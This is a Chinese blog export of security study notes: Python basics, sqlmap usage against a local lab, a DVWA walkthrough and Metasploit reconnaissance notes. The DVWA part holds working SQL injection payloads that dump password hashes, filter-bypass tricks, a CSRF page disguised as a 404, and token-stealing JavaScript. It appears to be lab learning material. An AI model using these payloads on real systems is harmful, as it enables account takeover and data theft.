<tr>
<td><strong>%d</strong></td>
<td><strong>有符号整数(十进制)</strong></td>
</tr>
<tr>
<td>%u</td>
<td>无符号整数(十进制)</td>
</tr>
<tr>
<td>%o</td>
<td>无符号整数(八进制)</td>
</tr>
<tr>
<td>%x</td>
<td>无符号整数(十六进制)</td>
</tr>
<tr>
<td>%X</td>
<td>无符号整数(十六进制大写字符)</td>
</tr>
<tr>
<td>%e</td>
<td>浮点数字(科学计数法)</td>
</tr>
<tr>
<td>%E</td>
<td>浮点数字(科学计数法，用E代替e)</td>
</tr>
<tr>
<td>%f</td>
<td>浮点数字(用小数点符号)</td>
</tr>
<tr>
<td>%g</td>
<td>浮点数字(根据值的大小采用%e或%f)</td>
</tr>
<tr>
<td>%G</td>
<td>浮点数字(类似于%g)</td>
</tr>
<tr>
<td>%p</td>
<td>指针(用十六进制打印值的内存地址)</td>
</tr>
<tr>
<td>%n</td>
<td>存储输出字符的数量放进参数列表的下一个变量中</td>
</tr>
</tbody></table>
<h4 id="format-格式化函数"><a href="#format-格式化函数" class="headerlink" title="format 格式化函数"></a>format 格式化函数</h4><p>基本语法是通过 {} 和 : 来代替以前的 % 。</p>
<p>format 函数可以接受不限个参数，位置可以不按顺序。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">print(<span class="string">"网站名：&#123;name&#125;, 地址 &#123;url&#125;"</span>.format(name=<span class="string">"菜鸟教程"</span>, url=<span class="string">"www.runoob.com"</span>))</span><br></pre></td></tr></table></figure>

<h3 id="python2和python3的一些区别"><a href="#python2和python3的一些区别" class="headerlink" title="python2和python3的一些区别"></a>python2和python3的一些区别</h3><p>b = b”example”    # bytes object   </p>
<p>s = “example”     # str object  </p>
<ul>
<li>chj=str.encode(c)  str to bytes </li>
<li>chj=bytes.decode(c) bytes to str</li>
</ul>
<hr>
<h2 id="Python-核心编程学习"><a href="#Python-核心编程学习" class="headerlink" title="Python 核心编程学习"></a><strong>Python 核心编程学习</strong></h2><h3 id="正则表达式"><a href="#正则表达式" class="headerlink" title="正则表达式"></a><strong>正则表达式</strong></h3><p><strong>引入re模块 ——-import re</strong></p>
<table>
<thead>
<tr>
<th align="center">表示法</th>
<th>描述</th>
<th>例子</th>
<th>匹配对象</th>
</tr>
</thead>
<tbody><tr>
<td align="center">chj</td>
<td>匹配文本字符串的值chj</td>
<td>chj</td>
<td></td>
</tr>
<tr>
<td align="center">re1 | re2</td>
<td>匹配正则表达式re1或者re2</td>
<td>chj | bar</td>
<td></td>
</tr>
<tr>
<td align="center">.</td>
<td>匹配任何字符（除了\n）</td>
<td>a.a</td>
<td></td>
</tr>
<tr>
<td align="center">^</td>
<td>匹配字符串的起始部分</td>
<td>^Dear</td>
<td></td>
</tr>
<tr>
<td align="center">$</td>
<td>匹配字符串的终止部分</td>
<td></td>
<td></td>
</tr>
<tr>
<td align="center"><strong>+</strong></td>
<td><strong>匹配1次或者多次前面的表达式</strong></td>
<td><strong>chj+</strong></td>
<td><strong>chj以及chjj   等价于{1,}</strong></td>
</tr>
<tr>
<td align="center">?</td>
<td><strong>匹配0次或者1次前面的表达式</strong></td>
<td>goo?</td>
<td></td>
</tr>
<tr>
<td align="center"></td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td align="center"></td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td align="center"></td>
<td></td>
<td></td>
<td></td>
</tr>
</tbody></table>
<p>re.compile(r’[A-F0-9]+’)</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line">s = <span class="string">"adfad asdfasdf asdfas asdfawef asd adsfas "</span></span><br><span class="line"> </span><br><span class="line">reObj1 = re.compile(<span class="string">'((\w+)\s+\w+)'</span>)</span><br><span class="line">reObj1.findall(s)</span><br><span class="line">[(<span class="string">'adfad asdfasdf'</span>, <span class="string">'adfad'</span>), (<span class="string">'asdfas asdfawef'</span>, <span class="string">'asdfas'</span>), (<span class="string">'asd adsfas'</span>, <span class="string">'asd'</span>)]</span><br><span class="line"> </span><br><span class="line">reObj2 = re.compile(<span class="string">'(\w+)\s+\w+'</span>)</span><br><span class="line">reObj2.findall(s)</span><br><span class="line">[<span class="string">'adfad'</span>, <span class="string">'asdfas'</span>, <span class="string">'asd'</span>]</span><br><span class="line"> </span><br><span class="line">reObj3 = re.compile(<span class="string">'\w+\s+\w+'</span>)</span><br><span class="line">reObj3.findall(s)</span><br><span class="line">[<span class="string">'adfad asdfasdf'</span>, <span class="string">'asdfas asdfawef'</span>, <span class="string">'asd adsfas'</span>]</span><br></pre></td></tr></table></figure>















]]></content>
  </entry>
  <entry>
    <title>常见渗透工具的使用</title>
    <url>/2020/04/02/%E5%B8%B8%E8%A7%81%E6%B8%97%E9%80%8F%E5%B7%A5%E5%85%B7%E7%9A%84%E4%BD%BF%E7%94%A8/</url>
    <content><![CDATA[<h2 id="Sqlmap"><a href="#Sqlmap" class="headerlink" title="Sqlmap"></a><strong>Sqlmap</strong></h2><p>介绍一下sqlmap：sqlmap支持MySQL, Oracle,PostgreSQL, Microsoft SQL Server, Microsoft  Access, IBM DB2, SQLite, Firebird,Sybase和SAP MaxDB等数据库的各种安全漏洞检测。</p>
<p>sqlmap支持五种不同的注入模式：</p>
<blockquote>
<p><strong>l 基于布尔的盲注</strong>，即可以根据返回页面判断条件真假的注入；</p>
<p><strong>l 基于时间的盲注</strong>，即不能根据页面返回内容判断任何信息，用条件语句查看时间延迟语句是否执行（即页面返回时间是否增加）来判断；</p>
<p><strong>l 基于报错注入</strong>，即页面会返回错误信息，或者把注入的语句的结果直接返回在页面中；</p>
<p><strong>l 联合查询注入</strong>，可以使用union的情况下的注入；</p>
<p><strong>l 堆查询注入</strong>，可以同时执行多条语句的执行时的注入。</p>
</blockquote>
<h3 id="输出级别"><a href="#输出级别" class="headerlink" title="输出级别"></a>输出级别</h3><p><strong>参数：-v</strong></p>
<p>Sqlmap的输出信息按从简到繁共分为7个级别，依次为0、1、2、3、4、5和6</p>
<p>使用参数“-v 6”来指定输出级别为6。默认输出级别为1。各个输出级别的描述如下：</p>
<ul>
<li>0：只显示Python的tracebacks信息、错误信息[ERROR]和关键信息[CRITICAL]；</li>
<li>1：同时显示普通信息[INFO]和警告信息[WARNING]；</li>
<li>2：同时显示调试信息[DEBUG]；</li>
<li>3：同时显示注入使用的攻击荷载；</li>
<li>4：同时显示HTTP请求；</li>
<li>5：同时显示HTTP响应头；</li>
<li>6：同时显示HTTP响应体。</li>
</ul>
<p><strong>如果想看到sqlmap发送的测试payload最好的等级就是3</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#判断注入点</span><br><span class="line">sqlmap -u &quot;http:&#x2F;&#x2F;127.0.0.1:10086&#x2F;Less-5&#x2F;?id&#x3D;1&quot;</span><br><span class="line">#获取当前数据库</span><br><span class="line">sqlmap -u &quot;http:&#x2F;&#x2F;127.0.0.1:10086&#x2F;Less-5&#x2F;?id&#x3D;1&quot; --current-db</span><br><span class="line"></span><br><span class="line">#获取表</span><br><span class="line">sqlmap -u &quot;http:&#x2F;&#x2F;127.0.0.1:10086&#x2F;Less-5&#x2F;?id&#x3D;1&quot; -D  security --tables</span><br><span class="line">#获取字段</span><br><span class="line">sqlmap -u &quot;http:&#x2F;&#x2F;127.0.0.1:10086&#x2F;Less-5&#x2F;?id&#x3D;1&quot; -D  security  -T users --columns</span><br><span class="line"></span><br><span class="line">#获取对应字段的值</span><br><span class="line">sqlmap -u &quot;http:&#x2F;&#x2F;127.0.0.1:10086&#x2F;Less-5&#x2F;?id&#x3D;1&quot; -D  security  -T users -C id,password,username --dump</span><br></pre></td></tr></table></figure>




]]></content>
      <tags>
        <tag>渗透工具</tag>
      </tags>
  </entry>
  <entry>
    <title>DVWA</title>
    <url>/2020/04/02/DVWA/</url>
    <content><![CDATA[<h2 id="SQL-Injection"><a href="#SQL-Injection" class="headerlink" title="SQL Injection"></a><strong>SQL Injection</strong></h2><h3 id="low"><a href="#low" class="headerlink" title="low"></a><strong>low</strong></h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1&#39; union select 1,table_name from information_schema.tables where table_schema&#x3D;&#39;dvwa&#39;#</span><br><span class="line">&#x2F;&#x2F;输出如下</span><br><span class="line">ID: 1&#39; union select 1,table_name from information_schema.tables where table_schema&#x3D;&#39;dvwa&#39;#</span><br><span class="line">First name: 1</span><br><span class="line">Surname: guestbook</span><br><span class="line">ID: 1&#39; union select 1,table_name from information_schema.tables where table_schema&#x3D;&#39;dvwa&#39;#</span><br><span class="line">First name: 1</span><br><span class="line">Surname: users</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;爆users的列</span><br><span class="line">1&#39; union select 1,column_name from information_schema.columns where table_name&#x3D;&#39;users&#39;#</span><br><span class="line">ID: 1&#39; union select 1,column_name from information_schema.columns where table_name&#x3D;&#39;users&#39;#</span><br><span class="line">First name: 1</span><br><span class="line">Surname: user</span><br><span class="line">ID: 1&#39; union select 1,column_name from information_schema.columns where table_name&#x3D;&#39;users&#39;#</span><br><span class="line">First name: 1</span><br><span class="line">Surname: password</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;爆user列和password列的字段内容</span><br><span class="line">1&#39; union select 1,concat(user,password) from users#</span><br></pre></td></tr></table></figure>

<h3 id="medium"><a href="#medium" class="headerlink" title="medium"></a><strong>medium</strong></h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//直接爆数据库名和表名                                         末尾加  &amp;&amp;Submit=Submit</span></span><br><span class="line">id=<span class="number">1</span> union select database(),table_name from information_schema.tables where table_schema=database()<span class="comment">#</span></span><br><span class="line"><span class="comment">//查询用户名和对应的密码</span></span><br><span class="line">id=<span class="number">1</span> union select concat(user),concat(password)  from users <span class="comment">##&amp;&amp;Submit=Submit</span></span><br></pre></td></tr></table></figure>

<h3 id="high"><a href="#high" class="headerlink" title="high"></a><strong>high</strong></h3><p>不是很懂这里后面加了limit1 有什么用，注释掉就好了</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">ID: id=<span class="number">1</span><span class="string">'  union select concat(user),concat(password)  from users #</span></span><br><span class="line"><span class="string">First name: admin</span></span><br><span class="line"><span class="string">Surname: 5f4dcc3b5aa765d61d8327deb882cf99</span></span><br></pre></td></tr></table></figure>

<h3 id="impossible"><a href="#impossible" class="headerlink" title="impossible"></a><strong>impossible</strong></h3><p>这个就很有意思了，新手很值得学习，代码如下：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    </span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( $_GET[ <span class="string">'Submit'</span> ] ) ) &#123;</span><br><span class="line">    <span class="comment">// Check Anti-CSRF token</span></span><br><span class="line">    checkToken( $_REQUEST[ <span class="string">'user_token'</span> ], $_SESSION[ <span class="string">'session_token'</span> ], <span class="string">'index.php'</span> );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Get input</span></span><br><span class="line">    $id = $_GET[ <span class="string">'id'</span> ];</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Was a number entered?</span></span><br><span class="line">    <span class="keyword">if</span>(is_numeric( $id )) &#123;</span><br><span class="line">        <span class="comment">// Check the database</span></span><br><span class="line">        $data = $db-&gt;prepare( <span class="string">'SELECT first_name, last_name FROM users WHERE user_id = (:id) LIMIT 1;'</span> );</span><br><span class="line">        $data-&gt;bindParam( <span class="string">':id'</span>, $id, PDO::PARAM_INT );</span><br><span class="line">        $data-&gt;execute();</span><br><span class="line">        $row = $data-&gt;fetch();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Make sure only 1 result is returned</span></span><br><span class="line">        <span class="keyword">if</span>( $data-&gt;rowCount() == <span class="number">1</span> ) &#123;</span><br><span class="line">            <span class="comment">// Get values</span></span><br><span class="line">            $first = $row[ <span class="string">'first_name'</span> ];</span><br><span class="line">            $last  = $row[ <span class="string">'last_name'</span> ];</span><br></pre></td></tr></table></figure>

<p>引用<a href="https://blog.csdn.net/qq_45555226/article/details/102884030" target="_blank" rel="noopener">大佬</a>的一张图可以很直观的看到从low到impossible级别所加的防御机制</p>
<img src="/2020/04/02/DVWA/1.png" style="zoom: 67%;">

<p>一般来讲，<strong>is_numeric()</strong> 可以利用16进制绕过，比如 1 or 1=1  &gt;&gt;0x314f52313d31</p>
<p>可以考虑采用<strong>正则表达式</strong>的方法来取代is_numberic函数</p>
<p>一、如果发现一个url可能是注入点之后我们可以尝试手注，但是一般的网站都会过滤一些字符串。</p>
<p>在^没有被过滤的时候可以利用它来测试</p>
<p>异或：xor或^</p>
<p>逻辑运算就是：同真异假（两个条件结果相同就为真，结果不同就为假）</p>
<p>例如：1^0 就是 1 ，1^1 就是 0</p>
<p>例如：?id=1’ ^ (length(‘union’)!=0)–+</p>
<p>如果union被过滤，则后面条件的结果就是假的，前面也是假的，url返回正确</p>
<p>如果union没有被过滤，则后面的条件的结果就是真的，而前面是假的，url返回错误</p>
<p>也可以是?id=1’ ^ (length(‘union’)=5)–+</p>
<p>二、简单的sql绕过</p>
<p>基本关键字：括号、空格、引号、#、=、+、and、or、order、select、union、update、inster、into、delete、outfile……</p>
<p>一些绕过的方法：</p>
<p>1、 大小写混写</p>
<p>2、 使用url编码替换字符 ‘ %27，# %23</p>
<p>3、 十六进制绕过 where=“user” where=0x7573657273</p>
<p>4、使用&amp;&amp; || 代替and or</p>
<p>5、双写关键字 aandnd</p>
<p>6、绕过空格：用tab键代替空格</p>
<p>用回车chr(13)&amp;chr(10)，url编码的形式%0d%0a</p>
<p>用括号 id=1(and)1=1</p>
<p>7、=用like、rlike、等代替</p>
<p>8、使用/<strong>/注释符来，重组关键字 un/</strong>/i/**/on</p>
<p>9、注释负：//，– , /**/, #, –+, – -, ;,%00,–a</p>
<p>如果是使用gbk的网页编码的网站也可以利用宽字节来绕过 </p>
<h2 id="XSS"><a href="#XSS" class="headerlink" title="XSS"></a>XSS</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>( array_key_exists( <span class="string">"name"</span>, $_GET ) &amp;&amp; $_GET[ <span class="string">'name'</span> ] != <span class="keyword">NULL</span> ) &#123;</span><br><span class="line">    <span class="comment">// Get input</span></span><br><span class="line">    $name = preg_replace( <span class="string">'/&lt;(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i'</span>, <span class="string">''</span>, $_GET[ <span class="string">'name'</span> ] );</span><br></pre></td></tr></table></figure>

<p> i 表示不区分大小写；<br>       “/[a-zA-Z]/“ &lt;==&gt;”/[a-z]/i”</p>
<h2 id="CSRF"><a href="#CSRF" class="headerlink" title="CSRF"></a><strong>CSRF</strong></h2><h3 id="low-1"><a href="#low-1" class="headerlink" title="low"></a>low</h3><p><strong>白盒测试，源码：</strong></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( $_GET[ <span class="string">'Change'</span> ] ) ) &#123;</span><br><span class="line">    <span class="comment">// Get input</span></span><br><span class="line">    $pass_new  = $_GET[ <span class="string">'password_new'</span> ];</span><br><span class="line">    $pass_conf = $_GET[ <span class="string">'password_conf'</span> ];</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Do the passwords match?</span></span><br><span class="line">    <span class="keyword">if</span>( $pass_new == $pass_conf ) &#123;</span><br><span class="line">        <span class="comment">// They do!</span></span><br><span class="line">        $pass_new = mysql_real_escape_string( $pass_new );</span><br><span class="line">        $pass_new = md5( $pass_new );</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Update the database</span></span><br><span class="line">        $insert = <span class="string">"UPDATE `users` SET password = '$pass_new' WHERE user = '"</span> . dvwaCurrentUser() . <span class="string">"';"</span>;</span><br><span class="line">        $result = mysql_query( $insert ) <span class="keyword">or</span> <span class="keyword">die</span>( <span class="string">'&lt;pre&gt;'</span> . mysql_error() . <span class="string">'&lt;/pre&gt;'</span> );</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Feedback for the user</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"&lt;pre&gt;Password Changed.&lt;/pre&gt;"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// Issue with passwords matching</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"&lt;pre&gt;Passwords did not match.&lt;/pre&gt;"</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    mysql_close();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>关键代码：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$pass_new = mysql_real_escape_string( $pass_new );</span><br><span class="line">$pass_new = md5( $pass_new );</span><br></pre></td></tr></table></figure>

<p>可以看出，这里只对GET进行了防sql注入，并没防CSRF机制</p>
<p>构造页面test.php</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&lt;img src=<span class="string">"http://127.0.0.1:12138/vulnerabilities/csrf/?password_new=123123chj&amp;password_conf=123123chj&amp;Change=Change#"</span> border=<span class="string">"0"</span> style=<span class="string">"display:none;"</span> /&gt;</span><br><span class="line">&lt;h1&gt;<span class="number">404</span>&lt;h1&gt;</span><br><span class="line">&lt;h2&gt;file not found&lt;h2&gt;</span><br></pre></td></tr></table></figure>

<p>只要引诱别人点击此，就可成功修改其密码。</p>
<p><strong>黑盒测试：</strong></p>
<p><strong>抓包查看有没有token</strong></p>
<p><strong>如果没有token，直接请求这个页面，不带refer</strong></p>
<p><strong>如果返回的数据还是一样的话，那说明很有可能有CSRF漏洞了，这是一个黑盒的挖掘方法</strong></p>
<p>抓包分析，发现有refer</p>
<p>删除refer观察发现返回结果一致</p>
<p>直接构造url，欺骗用户点击即可。</p>
<hr>
<h3 id="medium-1"><a href="#medium-1" class="headerlink" title="medium"></a><strong>medium</strong></h3><p>源码：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( $_GET[ <span class="string">'Change'</span> ] ) ) &#123;</span><br><span class="line">    <span class="comment">// Checks to see where the request came from</span></span><br><span class="line">    <span class="keyword">if</span>( eregi( $_SERVER[ <span class="string">'SERVER_NAME'</span> ], $_SERVER[ <span class="string">'HTTP_REFERER'</span> ] ) ) &#123;</span><br><span class="line">        <span class="comment">// Get input</span></span><br><span class="line">        $pass_new  = $_GET[ <span class="string">'password_new'</span> ];</span><br><span class="line">        $pass_conf = $_GET[ <span class="string">'password_conf'</span> ];</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Do the passwords match?</span></span><br><span class="line">        <span class="keyword">if</span>( $pass_new == $pass_conf ) &#123;</span><br><span class="line">            <span class="comment">// They do!</span></span><br><span class="line">            $pass_new = mysql_real_escape_string( $pass_new );</span><br><span class="line">            $pass_new = md5( $pass_new );</span><br><span class="line"></span><br><span class="line">            <span class="comment">// Update the database</span></span><br><span class="line">            $insert = <span class="string">"UPDATE `users` SET password = '$pass_new' WHERE user = '"</span> . dvwaCurrentUser() . <span class="string">"';"</span>;</span><br><span class="line">            $result = mysql_query( $insert ) <span class="keyword">or</span> <span class="keyword">die</span>( <span class="string">'&lt;pre&gt;'</span> . mysql_error() . <span class="string">'&lt;/pre&gt;'</span> );</span><br><span class="line"></span><br><span class="line">            <span class="comment">// Feedback for the user</span></span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"&lt;pre&gt;Password Changed.&lt;/pre&gt;"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">// Issue with passwords matching</span></span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"&lt;pre&gt;Passwords did not match.&lt;/pre&gt;"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// Didn't come from a trusted source</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"&lt;pre&gt;That request didn't look correct.&lt;/pre&gt;"</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    mysql_close();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>防CSRF攻击代码：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">eregi( $_SERVER[ <span class="string">'SERVER_NAME'</span> ], $_SERVER[ <span class="string">'HTTP_REFERER'</span> ])</span><br></pre></td></tr></table></figure>

<p>解析：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">eregi(string pattern, string str)：</span><br><span class="line"><span class="comment">#检查str中是否含有pattern（不区分大小写），如果有返回True，反之False。</span></span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">PHP超全局变量$_SERVER中的两个值：</span><br><span class="line">$_SERVER[<span class="string">'HTTP_REFERER'</span>]：PHP中获取链接到当前页面的前一页面的url链接地址，即HTTP数据包中的Referer参数的值。</span><br><span class="line">$_SERVER[<span class="string">'SERVER_NAME'</span>]：PHP中获取服务器主机的名称，即HTTP数据包中的Host参数的值。</span><br></pre></td></tr></table></figure>

<p>Referer参数的值，表示来源地址</p>
<p>Host：请求资源所在服务器</p>
<p>这种机制下，就要求来源地址要包含服务器主机地址</p>
<p><strong>绕过方式：</strong></p>
<p>假设攻击服务器主机的域名的域名为：<a href="http://www.chj.com" target="_blank" rel="noopener">www.chj.com</a></p>
<p>攻击者本机域名为：<a href="http://www.ccc.com" target="_blank" rel="noopener">www.ccc.com</a></p>
<p>则只需要将文件名改为<a href="http://www.chj.com" target="_blank" rel="noopener">www.chj.com</a></p>
<p>那么访问的时候refer便是<a href="http://www.ccc.com/www.chj.com" target="_blank" rel="noopener">www.ccc.com/www.chj.com</a></p>
<p>成功包含host，即可绕过。</p>
<p><strong>目前高版本的PHP已经放弃这个函数了，如php5.3</strong></p>
<hr>
<h3 id="high-1"><a href="#high-1" class="headerlink" title="high"></a><strong>high</strong></h3><p>源码:</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( $_GET[ <span class="string">'Change'</span> ] ) ) &#123;</span><br><span class="line">    <span class="comment">// Check Anti-CSRF token</span></span><br><span class="line">    checkToken( $_REQUEST[ <span class="string">'user_token'</span> ], $_SESSION[ <span class="string">'session_token'</span> ], <span class="string">'index.php'</span> );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Get input</span></span><br><span class="line">    $pass_new  = $_GET[ <span class="string">'password_new'</span> ];</span><br><span class="line">    $pass_conf = $_GET[ <span class="string">'password_conf'</span> ];</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Do the passwords match?</span></span><br><span class="line">    <span class="keyword">if</span>( $pass_new == $pass_conf ) &#123;</span><br><span class="line">        <span class="comment">// They do!</span></span><br><span class="line">        $pass_new = mysql_real_escape_string( $pass_new );</span><br><span class="line">        $pass_new = md5( $pass_new );</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Update the database</span></span><br><span class="line">        $insert = <span class="string">"UPDATE `users` SET password = '$pass_new' WHERE user = '"</span> . dvwaCurrentUser() . <span class="string">"';"</span>;</span><br><span class="line">        $result = mysql_query( $insert ) <span class="keyword">or</span> <span class="keyword">die</span>( <span class="string">'&lt;pre&gt;'</span> . mysql_error() . <span class="string">'&lt;/pre&gt;'</span> );</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Feedback for the user</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"&lt;pre&gt;Password Changed.&lt;/pre&gt;"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// Issue with passwords matching</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"&lt;pre&gt;Passwords did not match.&lt;/pre&gt;"</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    mysql_close();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Generate Anti-CSRF token</span></span><br><span class="line">generateSessionToken();</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>防护机制：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">checkToken( $_REQUEST[ <span class="string">'user_token'</span> ], $_SESSION[ <span class="string">'session_token'</span> ], <span class="string">'index.php'</span> );</span><br></pre></td></tr></table></figure>

<p>抓包发现，这个token是随机生成的，所以要想绕过此机制，关键是要获取token，要利用受害者的cookie去修改密码的页面获取关键的token。</p>
<p>攻击代码：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">alert(document.cookie);</span><br><span class="line"><span class="keyword">var</span> theUrl = <span class="string">'http://www.dvwa.com/vulnerabilities/csrf/'</span>;</span><br><span class="line">    <span class="keyword">if</span>(window.XMLHttpRequest) &#123;</span><br><span class="line">        xmlhttp = <span class="keyword">new</span> XMLHttpRequest();</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        xmlhttp = <span class="keyword">new</span> ActiveXObject(<span class="string">"Microsoft.XMLHTTP"</span>);</span><br><span class="line">    &#125;</span><br><span class="line"><span class="keyword">var</span> count = <span class="number">0</span>;</span><br><span class="line">    xmlhttp.withCredentials = <span class="keyword">true</span>;</span><br><span class="line">    xmlhttp.onreadystatechange=<span class="function"><span class="keyword">function</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(xmlhttp.readyState ==<span class="number">4</span> &amp;&amp; xmlhttp.status==<span class="number">200</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">var</span> text = xmlhttp.responseText;</span><br><span class="line">            <span class="keyword">var</span> regex = /user_token\<span class="string">' value\=\'(.*?)\' \/\&gt;/;</span></span><br><span class="line"><span class="string">            var match = text.match(regex);</span></span><br><span class="line"><span class="string">            console.log(match);</span></span><br><span class="line"><span class="string">            alert(match[1]);</span></span><br><span class="line"><span class="string">                var token = match[1];</span></span><br><span class="line"><span class="string">                    var new_url = '</span>http:<span class="comment">//127.0.0.1/vulnerabilities/csrf/?user_token='+token+'&amp;password_new=test&amp;password_conf=test&amp;Change=Change';</span></span><br><span class="line">                    <span class="keyword">if</span>(count==<span class="number">0</span>)&#123;</span><br><span class="line">                        count++;</span><br><span class="line">                        xmlhttp.open(<span class="string">"GET"</span>,new_url,<span class="keyword">false</span>);</span><br><span class="line">                        xmlhttp.send();</span><br><span class="line">                    &#125;</span><br><span class="line">                    </span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;;</span><br><span class="line">    xmlhttp.open(<span class="string">"GET"</span>,theUrl,<span class="keyword">false</span>);</span><br><span class="line">    xmlhttp.send();</span><br></pre></td></tr></table></figure>





]]></content>
  </entry>
  <entry>
    <title>Metasploit魔鬼训练营</title>
    <url>/2020/04/01/Metasploit%E9%AD%94%E9%AC%BC%E8%AE%AD%E7%BB%83%E8%90%A5/</url>
    <content><![CDATA[<h2 id="一、基础知识概念"><a href="#一、基础知识概念" class="headerlink" title="一、基础知识概念"></a><strong>一、基础知识概念</strong></h2><p><strong>黑盒测试：</strong>设计为模拟一个对客户组织一无所知的攻击者所进行的渗透攻击</p>
<p><strong>白盒测试：</strong>拥有客户组织所有知识的情况下，进行的渗透测试</p>
<p>PTES渗透测试标准，具体包括7个阶段：</p>
<p><strong>1.前期交互截断</strong></p>
<p>  确定渗透测试的范围、目标、限制条件以及服务合同细节。主要是收集客户需求、准备测试计划、定义测试范围与边界、定义业务目标等</p>
<p><strong>2.情报收集阶段</strong></p>
<p><strong>3.威胁建模阶段</strong></p>
<p><strong>4.漏洞分析阶段</strong></p>
<p><strong>5.渗透攻击阶段</strong></p>
<p><strong>6.后渗透攻击阶段</strong></p>
<p><strong>7.报告阶段</strong></p>
<h2 id="二、相关命令"><a href="#二、相关命令" class="headerlink" title="二、相关命令"></a><strong>二、相关命令</strong></h2><h3 id="1-信息收集"><a href="#1-信息收集" class="headerlink" title="1.信息收集"></a>1.信息收集</h3><h4 id="whois域名注册信息查询"><a href="#whois域名注册信息查询" class="headerlink" title="whois域名注册信息查询"></a><strong>whois</strong>域名注册信息查询</h4><p>一般域名注册信息包含<strong>域名所有者、服务商、管理员邮件地址、域名注册信息和过期日期</strong>等</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">msf5 &gt; whois testfire.net</span><br><span class="line">[*] exec: whois testfire.net</span><br><span class="line">   Domain Name: TESTFIRE.NET</span><br><span class="line">   Registry Domain ID: 8363973_DOMAIN_NET-VRSN</span><br><span class="line">   Registrar WHOIS Server: whois.corporatedomains.com</span><br><span class="line">   Registrar URL: http://www.cscglobal.com/global/web/csc/digital-brand-services.html</span><br><span class="line">   Updated Date: 2019-09-08T04:08:07Z</span><br><span class="line">   Creation Date: 1999-07-23T13:52:32Z</span><br><span class="line">   Registry Expiry Date: 2020-07-23T13:52:32Z</span><br><span class="line">   Registrar: CSC Corporate Domains, Inc.</span><br><span class="line">   Registrar IANA ID: 299</span><br><span class="line">   Registrar Abuse Contact Email: domainabuse@cscglobal.com</span><br><span class="line">   Registrar Abuse Contact Phone: 8887802723</span><br></pre></td></tr></table></figure>

